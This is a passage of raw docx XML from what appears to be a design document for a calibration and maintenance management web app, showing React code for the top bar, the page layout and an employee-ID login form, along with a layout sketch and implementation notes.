            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="flex items-center gap-3"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        {user ? (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;Badge color="badge"&gt;{user.role}&lt;/Badge&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;div aria-label={`Signed in as ${user.sub}`}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                 className="h-8 w-8 rounded-full bg-accent/10 text-accent flex items-center justify-center text-xs font-semibold"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              {initialsOf(user.sub)}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">          &lt;/&gt;) : null}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/header&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.5  Layout.jsx — Sidebar + TopBar + scrollable main</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src/components/Layout.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Sidebar } from './Sidebar.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { TopBar } from './TopBar.jsx';</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export function Layout({ children, title }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;div className="flex h-full min-h-screen bg-base"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;Sidebar /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="flex-1 flex flex-col min-w-0"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;TopBar title={title} /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;main className="flex-1 overflow-auto p-8"&gt;{children}&lt;/main&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;/div&gt;);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.6  Login.jsx — Matches the Reference Image</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Layout sketch — what the user sees</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layout sketch</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            CMCMIS·                              ← Brand size="lg" (ink + accent dot)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   Calibration &amp; Maintenance Management         ← ink-soft, text-sm</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">              ISRO SAC                          ← ink-soft/80, text-xs</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 xml:space="preserve">   │  Sign In                            │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  Employee ID                        │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  [SA79900______]                    │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  helper text                        │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  Password                           │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  [••••••••______]                   │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  [   →  Sign In         ]  ← accent │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  ──── or ────                       │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  [ Continue with SSO (Coming soon)] │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   │  Authorised personnel only…         │</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">   └─────────────────────────────────────┘</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Key implementation choices</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>react-hook-form + zodResolver(loginSchema) for client-side validation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Auto-uppercase via register('employee_id', { onChange: e =&gt; e.target.value = e.target.value.toUpperCase() }).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>autoComplete='username' / 'current-password' so password managers fill correctly.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Disabled 'Continue with SSO' button with 'Coming soon' badge — future feature placeholder.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Loading-spinner-inside-button pattern on isSubmitting.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="40"/>
        <w:ind w:left="340"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>If silent refresh succeeded on mount, redirect to /dashboard without showing the form.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Login.jsx — the core form</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src/pages/Login.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { register, handleSubmit, formState: { errors, isSubmitting } } = useForm({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  resolver: zodResolver(loginSchema),</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async function onSubmit(values) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  setServerError('');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  try {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    await login(values.employee_id, values.password);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const target = location.state?.from?.pathname || '/dashboard';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    navigate(target, { replace: true });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  } catch (err) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const apiMessage =</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      err?.response?.data?.error?.message ||</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      (err?.response?.status === 429</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ? 'Too many attempts. Please try again later.'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        : 'Sign-in failed. Please try again.');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    setServerError(apiMessage);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  }</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JSX (abridged)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>&lt;form onSubmit={handleSubmit(onSubmit)} noValidate className="space-y-4"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;FormField label="Employee ID"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             error={errors.employee_id?.message}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             helper="Two uppercase letters + five digits (e.g. SA79900)"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;Input placeholder="SA79900" autoComplete="username" maxLength={7}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           autoCapitalize="characters" autoFocus</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           {...register('employee_id', {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">             onChange: e =&gt; { e.target.value = (e.target.value||'').toUpperCase(); }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">           })} /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  &lt;/FormField&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
